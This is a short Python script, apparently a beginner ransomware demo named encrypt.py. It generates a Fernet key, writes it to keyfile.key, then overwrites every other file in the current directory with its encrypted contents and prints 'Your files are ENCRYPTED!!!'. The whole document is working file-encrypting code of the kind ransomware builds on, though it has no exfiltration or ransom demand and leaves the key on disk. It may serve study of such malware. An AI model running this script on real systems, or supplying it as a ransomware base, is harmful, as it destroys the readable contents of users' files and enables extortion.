#!/usr/bin/env python3



import os
from cryptography.fernet import Fernet


my_key = Fernet.generate_key() # generate the key!!!

files= [] #this is the list that will be used to store the files in current directory.


for file in os.listdir():
    if file == "encrypt.py" or file == "keyfile.key" or file == "decrypt.py": ## you must skip these 2 files otherwise you may not be able to decrypt the file or encrypt again.
        continue
    if os.path.isfile(file):
        files.append(file)

with open("keyfile.key", "wb") as key: # store the key in a file
    key.write(my_key)


for file in files:
    with open(file, "rb") as each_file:  #read each file in binary mode and retrieve their content
        file_content = each_file.read()

    encrypted_contents = Fernet(my_key).encrypt(file_content) #encrypt the retrieved content

    with open(file, "wb") as weach_file:
        weach_file.write(encrypted_contents) #write the encrypted content on the same file

print("Your files are ENCRYPTED!!!")
